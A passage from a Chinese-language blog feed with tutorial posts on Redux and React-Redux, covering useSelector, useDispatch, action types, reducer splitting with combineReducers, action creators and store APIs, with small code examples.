store=&#123;store&#125;&gt;</span><br><span class="line">    &lt;App /&gt;</span><br><span class="line">  &lt;<span class="regexp">/Provider&gt;</span></span><br><span class="line"><span class="regexp">)</span></span><br></pre></td></tr></table></figure><h1 id="获取状态useSelector"><a href="#获取状态useSelector" class="headerlink" title="获取状态useSelector"></a>获取状态useSelector</h1><ul><li><code>useSelector</code>：获取 Redux 提供的状态数据</li><li>参数：selector 函数，用于从 Redux 状态中筛选出需要的状态数据并返回</li><li>返回值：筛选出的状态</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useSelector &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Redux 中的状态是数值，所以，可以直接返回 state 本身</span></span><br><span class="line"><span class="keyword">const</span> count = useSelector(<span class="function"><span class="params">state</span> =&gt;</span> state)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比如，Redux 中的状态是个对象，就可以：</span></span><br><span class="line"><span class="keyword">const</span> list = useSelector(<span class="function"><span class="params">state</span> =&gt;</span> state.list)</span><br></pre></td></tr></table></figure><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useSelector &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> count = useSelector(<span class="function"><span class="params">state</span> =&gt;</span> state)</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button&gt;数值增加&lt;/</span>button&gt;</span><br><span class="line">&lt;button&gt;数值减少&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="分发动作useDispatch"><a href="#分发动作useDispatch" class="headerlink" title="分发动作useDispatch"></a>分发动作useDispatch</h1><ul><li><p><code>useDispatch</code>：拿到 dispatch 函数，分发 action，修改 redux 中的状态数据</p></li><li><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useDispatch &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 useDispatch hook，拿到 dispatch 函数</span></span><br><span class="line"><span class="keyword">const</span> dispatch = useDispatch()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 dispatch 传入 action，来分发动作</span></span><br><span class="line">dispatch( action )</span><br></pre></td></tr></table></figure></li></ul><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useDispatch &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> dispatch = useDispatch()</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &#123;/</span>* 调用 dispatch 分发 action *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; dispatch(increment(2))&#125;&gt;数值增加&lt;/</span>button&gt;</span><br><span class="line">&lt;button onClick=&#123;() =&gt; dispatch(decrement(<span class="number">5</span>))&#125;&gt;数值减少&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="理解-Redux-数据流"><a href="#理解-Redux-数据流" class="headerlink" title="理解 Redux 数据流"></a>理解 Redux 数据流</h1><p><img src="https://oss.iyouhun.com/img/md/ReduxDataFlow.49fa8c39.gif" alt="ReduxDataFlow.49fa8c39"></p><ul><li>任何一个组件都可以直接接入 Redux，也就是可以直接：1 修改 Redux 状态 2 接收 Redux 状态</li><li>并且，只要 Redux 中的状态改变了，所有接收该状态的组件都会收到通知，也就是可以获取到最新的 Redux 状态</li><li>这样的话，两个组件不管隔得多远，都可以<strong>直接通讯</strong>了</li></ul><h1 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h1><p>在使用 Redux 进行项目开发时，不会将 action/reducer/store 都放在同一个文件中，而是会进行拆分</p><p>可以按照以下结构，来组织 Redux 的代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/store        --- 在 src 目录中创建，用于存放 Redux 相关的代码</span><br><span class="line">  /actions    --- 存放所有的 action</span><br><span class="line">  /reducers   --- 存放所有的 reducer</span><br><span class="line">  index.js    --- redux 的入口文件，用来创建 store</span><br></pre></td></tr></table></figure><h1 id="ActionType的使用"><a href="#ActionType的使用" class="headerlink" title="ActionType的使用"></a>ActionType的使用</h1><ul><li><p>Action Type 指的是：action 对象中 type 属性的值</p></li><li><p>Redux 项目中会多次使用 action type，比如，action 对象、reducer 函数、dispatch(action) 等</p></li><li><p>目标：<strong>集中处理 action type，保持项目中 action type 的一致性</strong></p></li><li><p>action type 的值采用：<code>&#39;domain/action&#39;(功能/动作)形式</code>，进行分类处理，比如，</p><ul><li>计数器：<code>&#39;counter/increment&#39;</code> 表示 Counter 功能中的 increment 动作</li><li>登录：<code>&#39;login/getCode&#39;</code> 表示登录获取验证码的动作</li><li>个人资料：<code>&#39;profile/get&#39;</code> 表示获取个人资料</li></ul></li></ul><p><strong>步骤</strong>：</p><ol><li>在 store 目录中创建 <code>actionTypes</code> 目录或者 <code>constants</code> 目录，集中处理</li><li>创建<strong>常量</strong>来存储 action type，并导出</li><li>将项目中用到 action type 的地方替换为这些常量，从而保持项目中 action type 的一致性</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// actionTypes 或 constants 目录：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> increment = <span class="string">'counter/increment'</span></span><br><span class="line"><span class="keyword">const</span> decrement = <span class="string">'counter/decrement'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; increment, decrement &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// actions/index.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> types <span class="keyword">from</span> <span class="string">'../acitonTypes'</span></span><br><span class="line"><span class="keyword">const</span> increment = <span class="function"><span class="params">payload</span> =&gt;</span> (&#123; <span class="attr">type</span>: types.increment, payload &#125;)</span><br><span class="line"><span class="keyword">const</span> decrement = <span class="function"><span class="params">payload</span> =&gt;</span> (&#123; <span class="attr">type</span>: types.decrement, payload &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// reducers/index.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> types <span class="keyword">from</span> <span class="string">'../acitonTypes'</span></span><br><span class="line"><span class="keyword">const</span> reducer = <span class="function">(<span class="params">state, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> types.increment:</span><br><span class="line">      <span class="keyword">return</span> state + <span class="number">1</span></span><br><span class="line">    <span class="keyword">case</span> types.decrement:</span><br><span class="line">      <span class="keyword">return</span> state - action.payload</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>注：额外添加 Action Type 会让项目结构变复杂，此操作可省略。但，<code>domain/action</code> 命名方式强烈推荐！</em></p><h1 id="Reducer的分离与合并"><a href="#Reducer的分离与合并" class="headerlink" title="Reducer的分离与合并"></a>Reducer的分离与合并</h1><ul><li><p>随着项目功能变得越来越复杂，需要 Redux 管理的状态也会越来越多</p></li><li><p>此时，有两种方式来处理状态的更新：</p><ol><li>使用一个 reducer：处理项目中所有状态的更新</li><li>使用多个 reducer：按照项目功能划分，每个功能使用一个 reducer 来处理该功能的状态更新</li></ol></li><li><p>推荐：<strong>使用多个 reducer（第二种方案）</strong>，每个 reducer 处理的状态更单一，职责更明确</p></li><li><p>此时，项目中会有多个 reducer，但是 <strong>store 只能接收一个 reducer</strong>，因此，需要将多个 reducer 合并为一根 reducer，才能传递给 store</p></li><li><p>合并方式：使用 Redux 中的 <code>combineReducers</code> 函数</p></li><li><p>注意：</p><p>合并后，Redux 的状态会变为一个对象，对象的结构与 combineReducers 函数的参数结构相同</p><ul><li>比如，此时 Redux 状态为：<code>{ a： aReducer 处理的状态, b： bReducer 处理的状态 }</code></li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; combineReducers &#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计数器案例，状态默认值为：0</span></span><br><span class="line"><span class="keyword">const</span> aReducer = <span class="function">(<span class="params">state = <span class="number">0</span>, action</span>) =&gt;</span> &#123;&#125;</span><br><span class="line"><span class="comment">// Todos 案例，状态默认值为：[]</span></span><br><span class="line"><span class="keyword">const</span> bReducer = <span class="function">(<span class="params">state = [], action</span>) =&gt;</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并多个 reducer 为一个 根reducer</span></span><br><span class="line"><span class="keyword">const</span> rootReducer = combineReducers(&#123;</span><br><span class="line">  a: aReducer,</span><br><span class="line">  b: bReducer</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 store 时，传入 根reducer</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(rootReducer)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时，合并后的 redux 状态： &#123; a: 0, b: [] &#125;</span></span><br></pre></td></tr></table></figure><ul><li><p>注意：虽然在使用<code>combineReducers</code>以后，整个 Redux 应用的状态变为了<code>对象</code>，但是，对于每个 reducer 来说，每个 reducer 只负责整个状态中的某一个值</p><ul><li>也就是：<strong>每个reducer只负责自己要处理的状态</strong></li></ul></li><li>举例：<ul><li>登录功能：<code>loginReducer</code> 处理的状态只应该是跟登录相关的状态<ul><li>个人资料：<code>profileReducer</code> 处理的状态只应该是跟个人资料相关的状态</li></ul></li></ul></li><li>合并 reducer 后，redux 处理方式：只要合并了 reducer，不管分发什么 action，所有的 reducer 都会执行一次。各个 reducer 在执行的时候，能处理这个 action 就处理，处理不了就直接返回上一次的状态。所以，我们分发的某一个 action 就只能被某一个 reducer 来处理，也就是最终只会修改这个 reducer 要处理的状态，最终的表现就是：分发了 action，只修改了 redux 中这个 action 对应的状态！</li></ul><h1 id="redux管理哪些状态"><a href="#redux管理哪些状态" class="headerlink" title="redux管理哪些状态"></a>redux管理哪些状态</h1><p>不同状态的处理方式：</p><ol><li>将所有的状态全部放到 redux 中，由 redux 管理</li><li>只将某些状态数据放在 redux 中，其他数据可以放在组件中，比如：<ul><li>如果一个状态，只在某个组件中使用（比如，表单项的值），推荐：放在组件中</li><li>需要放到 redux 中的状态：<ol><li>在多个组件中都要使用的数据【涉及组件通讯】</li><li>通过 ajax 请求获取到的接口数据【涉及到请求相关逻辑代码放在哪的问题】</li></ol></li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;React-Redux介绍&quot;&gt;&lt;a href=&quot;#React-Redux介绍&quot; class=&quot;headerlink&quot; title=&quot;React-Redux介绍&quot;&gt;&lt;/a&gt;React-Redux介绍&lt;/h1&gt;&lt;p&gt;为什么要使用 React-Redux 绑定库?&lt;/p
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Redux状态管理工具" scheme="//www.shen.ee/tags/Redux%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    
      <category term="状态管理工具" scheme="//www.shen.ee/tags/%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    
      <category term="react-redux" scheme="//www.shen.ee/tags/react-redux/"/>
    
      <category term="actionType" scheme="//www.shen.ee/tags/actionType/"/>
    
  </entry>
  
  <entry>
    <title>Redux状态管理工具学习</title>
    <link href="//www.shen.ee/article/57612.html"/>
    <id>//www.shen.ee/article/57612.html</id>
    <published>2022-06-15T03:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Redux-概念"><a href="#Redux-概念" class="headerlink" title="Redux-概念"></a>Redux-概念</h2><blockquote><p>Redux 是 React 中最常用的状态管理工具（状态容器）</p></blockquote><p>文档：</p><ul><li><a href="http://cn.redux.js.org/" target="_blank" rel="noopener">redux 中文文档</a></li><li><a href="https://redux.js.org/" target="_blank" rel="noopener">redux 英文文档</a></li></ul><p>React的问题：</p><ul><li>React 只是 DOM 的一个抽象层（UI 库），并不是 Web 应用的完整解决方案。</li><li>因此 React 在涉及到数据的处理以及组件之间的通信时会比较复杂 。</li><li>对于大型的复杂应用来说，这两方面恰恰是最关键的，需要一个专门的状态工具。</li></ul><p>背景介绍：</p><ul><li>2014 年 Facebook 提出了 Flux 架构的概念（前端状态管理的概念），引发了很多的实现</li><li>2015 年，Redux 出现，将 Flux 与<em>函数式编程</em>结合一起，很短时间内就成为了最热门的前端架构</li><li>Flux 是最早的前端的状态管理工具，它提供了状态管理的思想，也提供对应的实现</li><li>除了 Flux、Redux 之外，还有：Mobx 等状态管理工具</li></ul><p>为什么需要Redux?</p><p><img src="https://oss.iyouhun.com/img/md/with-redux.e1b68afc.png" alt="with-redux.e1b68afc"></p><ul><li>不使用 Redux (图左边) ：<ul><li>只能使用父子组件通讯、状态提升等 React 自带机制</li><li>处理远房亲戚(非父子)关系的组件通讯时乏力</li><li>组件之间的数据流混乱，出现 Bug 时难定位</li></ul></li><li>使用 Redux (图右边)：<ul><li><strong>集中式存储和管理应用的状态</strong></li><li>处理组件通讯问题时，<strong>无视组件之间的层级关系</strong></li><li>简化大型复杂应用中组件之间的通讯问题</li><li>数据流清晰，易于定位 Bug</li></ul></li></ul><h2 id="Redux-核心要素"><a href="#Redux-核心要素" class="headerlink" title="Redux-核心要素"></a>Redux-核心要素</h2><p>为了让<strong>代码各部分职责清晰、明确</strong>，Redux 代码被分为三个核心概念：action/reducer/store</p><ol><li>三个核心概念的职责分别是什么<ul><li>action -&gt; reducer -&gt; store</li><li><strong>action</strong>（动作）：描述要做的事情</li><li><strong>reducer</strong>（函数）：更新状态</li><li><strong>store</strong>（仓库）：整合 action 和 reducer</li></ul></li><li>类比生活<ol><li>action：相当于公司中要做的事情，比如软件开发、测试，打扫卫生等</li><li>reducer：相当于公司的员工，负责干活的</li><li>store：相当于公司的老板</li><li>流程：老板(store)分配公司中要做的事情(action)给员工(reducer)，员工干完活把结果交给老板</li></ol></li></ol><h2 id="Redux-核心action"><a href="#Redux-核心action" class="headerlink" title="Redux-核心action"></a>Redux-核心action</h2><blockquote><p><code>action</code> 就是一个对象，<code>type</code> 描述行为，约定 <code>payload</code>做为传参。</p></blockquote><p>解释：</p><ul><li><code>action</code> 行动（名词）、动作</li><li>描述要做的事情，项目中的每一个功能都是一个 <code>action</code></li><li>例如：<ul><li>计数器案例：计数器加1、减1</li><li>购物车案例：获取购物车数据、切换商品选中状态</li><li>项目：登录，退出等</li></ul></li></ul><p>特点：</p><ul><li><code>action</code> 只描述做什么事情</li><li><code>action</code> 是一个JS对象，必须带有 <code>type</code> 属性，用于区分动作的类型</li><li>根据功能的不同，可以携带额外的数据（比如，<code>payload</code> 有效载荷），配合该动作来完成相应功能</li></ul><p>举例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 计数器案例</span></span><br><span class="line">&#123; type： <span class="string">'increment'</span> &#125; <span class="comment">// +1</span></span><br><span class="line">&#123; type： <span class="string">'decrement'</span> &#125; <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 累加10操作</span></span><br><span class="line">&#123; type： <span class="string">'increment'</span>, <span class="attr">payload</span>: <span class="number">10</span> &#125; <span class="comment">// +10</span></span><br><span class="line">&#123; type： <span class="string">'decrement'</span>, <span class="attr">payload</span>: <span class="number">10</span> &#125; <span class="comment">// -10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 购物车案例</span></span><br><span class="line">&#123; <span class="attr">type</span>: <span class="string">'getGoodsList'</span> &#125;</span><br><span class="line">&#123; <span class="attr">type</span>: <span class="string">'changeGoodsState'</span>, <span class="attr">payload</span>: &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">goodsState</span>: <span class="literal">true</span> &#125; &#125;</span><br></pre></td></tr></table></figure><h3 id="action-creator"><a href="#action-creator" class="headerlink" title="action creator"></a>action creator</h3><blockquote><p>使用函数创建 action 对象，简化多次使用 action 时，重复创建 action 对象</p></blockquote><p>举例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 不使用 Action Creator</span></span><br><span class="line"><span class="comment">// 创建多个 action 时，需要重复手动创建 action 对象，很繁琐</span></span><br><span class="line">&#123; <span class="attr">type</span>: <span class="string">'decrement'</span>, <span class="attr">payload</span>: <span class="number">2</span> &#125;</span><br><span class="line">&#123; <span class="attr">type</span>: <span class="string">'decrement'</span>, <span class="attr">payload</span>: <span class="number">8</span> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用 Action Creator</span></span><br><span class="line"><span class="keyword">const</span> decrement = <span class="function"><span class="params">payload</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">type</span>: <span class="string">'decrement'</span>, payload &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrement(<span class="number">2</span>) <span class="comment">// =&gt; &#123; type: 'decrement', payload: 2 &#125;</span></span><br><span class="line">decrement(<span class="number">8</span>) <span class="comment">// =&gt; &#123; type: 'decrement', payload: 8 &#125;</span></span><br><span class="line"><span class="comment">// 可以动态创建action</span></span><br></pre></td></tr></table></figure><h2 id="Redux-核心reducer"><a href="#Redux-核心reducer" class="headerlink" title="Redux-核心reducer"></a>Redux-核心reducer</h2><ul><li>名字是参考了 JS 数组中的 <code>reduce</code> 这个方法</li><li>数组中的 <code>reduce</code> 方法，可以来实现累计（比如，累加或者累减）</li></ul><p>作用：</p><ul><li>用来处理 action 并更新状态，是 Redux <code>状态更新</code> 的地方</li><li>函数签名为：<code>(prevState, action) =&gt; newState</code></li><li>接收上一次的状态和 action 作为参数，根据 action 的类型，执行不同操作，最终返回新的状态</li></ul><p>原则：</p><ul><li>函数一定要<strong>有返回值</strong>，即使状态没有改变也要返回上一次的状态</li><li>reducer 是一个纯函数<ul><li>不要使用 Math.random() / new Date() / Date.now() / ajax 请求等不纯的操作</li></ul></li><li>reducer 不能执行JS副作用<ul><li>不要直接修改当前状态，而是根据当前状态值创建新的状态值（新替旧）</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码：</span></span><br><span class="line"><span class="comment">// prevState 上一次的状态</span></span><br><span class="line"><span class="comment">// action 当前要执行的动作</span></span><br><span class="line"><span class="keyword">const</span> reducer = <span class="function">(<span class="params">prevState, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> newState</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：</span></span><br><span class="line"><span class="comment">// state 上一次的状态</span></span><br><span class="line"><span class="comment">// action 当前要执行的动作</span></span><br><span class="line"><span class="keyword">const</span> reducer = <span class="function">(<span class="params">state, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="comment">// 计数器增加</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'increment'</span>:</span><br><span class="line">      <span class="comment">// 返回新状态</span></span><br><span class="line">      <span class="comment">// return state + 1</span></span><br><span class="line">      <span class="comment">// 根据 action 中提供的 payload 来决定到底增加多少</span></span><br><span class="line">      <span class="keyword">return</span> state + action.payload</span><br><span class="line">    <span class="comment">// 注意：一定要有 default，如果将来 reducer 无法处理某个 action，就直接将上一次的状态返回即可</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟调用</span></span><br><span class="line">reducer(<span class="number">0</span>, &#123; <span class="attr">type</span>: <span class="string">'increment'</span> &#125;)  <span class="comment">// 本次执行完成后，状态变为：1</span></span><br><span class="line">reducer(<span class="number">1</span>, &#123; <span class="attr">type</span>: <span class="string">'increment'</span> &#125;)  <span class="comment">// 本次执行完成后，状态变为：2</span></span><br><span class="line">reducer(<span class="number">1</span>, &#123; <span class="attr">type</span>: <span class="string">'decrement'</span> &#125;)  <span class="comment">// 无法处理该 action，所以返回上一次状态：1</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><code>reducer</code> 是修改状态的地方，这里根据action的类型去修改状态</li><li>修改的原则：新值替换旧值，不能发请求和随机返回，不能操作全局变量</li></ul><h2 id="Redux-核心store"><a href="#Redux-核心store" class="headerlink" title="Redux-核心store"></a>Redux-核心store</h2><blockquote><p>通过store关联action和reducer</p></blockquote><p>store：仓库，Redux 的核心，整合 action 和 reducer</p><ul><li>特点：<ul><li><strong>一个应用只有一个 store</strong></li><li>维护应用的状态，获取状态：<code>store.getState()</code></li><li>发起状态更新时，需要分发 action：<code>store.dispatch(action)</code></li><li>创建 store 时<strong>接收 reducer 作为参数</strong>：<code>const store = createStore(reducer)</code></li></ul></li><li>其他 API，<ul><li>订阅(监听)状态变化：<code>const unSubscribe = store.subscribe(() =&gt; {})</code></li><li>取消订阅状态变化： <code>unSubscribe()</code></li></ul></li></ul><p>核心代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提前安装 redux </span></span><br><span class="line"><span class="keyword">import</span> &#123; legacy_createStore <span class="keyword">as</span> createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 store</span></span><br><span class="line"><span class="comment">// 参数为：reducer 函数</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(reducer)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新状态</span></span><br><span class="line"><span class="comment">// dispatch 派遣，派出。表示：分发一个 action，也就是发起状态更新</span></span><br><span class="line">store.dispatch(action)</span><br><span class="line">store.dispatch( increment(<span class="number">2</span>) )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取状态</span></span><br><span class="line"><span class="keyword">const</span> state = store.getState()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// 其他 API</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听状态变化</span></span><br><span class="line"><span class="keyword">const</span> unSubscribe = store.subscribe(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 状态改变时，执行相应操作</span></span><br><span class="line">  <span class="comment">// 比如，记录 redux 状态</span></span><br><span class="line">  <span class="built_in">console</span>.log(store.getState())</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取消监听状态变化</span></span><br><span class="line">unSubscribe()</span><br></pre></td></tr></table></figure><h2 id="Redux-默认值由来"><a href="#Redux-默认值由来" class="headerlink" title="Redux-默认值由来"></a>Redux-默认值由来</h2><ul><li>只要创建 store，那么，Redux 就会调用一次 reducer，这一次就是初始化默认值。</li><li>第一次调用 reducer <code>reducer(undefined, {type: &quot;@@redux/INITv.a.4.t.t.p&quot;})</code></li><li>因为传入的状态值是 undefined ，并且是一个随机的 action type，所以：<ul><li>状态值因为 undefined，所以，我们设置的默认值就会生效 <code>state = 10</code></li><li>因为是一个随机的 action type，那就一定会走 default，返回默认值 <code>10</code></li><li>Redux 内部拿到状态值，就用这个状态值，来作为了 store 中状态的默认值</li><li>因此，将来当我们调用 <code>store.getState()</code> 方法来获取 Redux 状态值就是默认值</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入 createStore</span></span><br><span class="line"><span class="keyword">import</span> &#123; legacy_createStore <span class="keyword">as</span> createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span 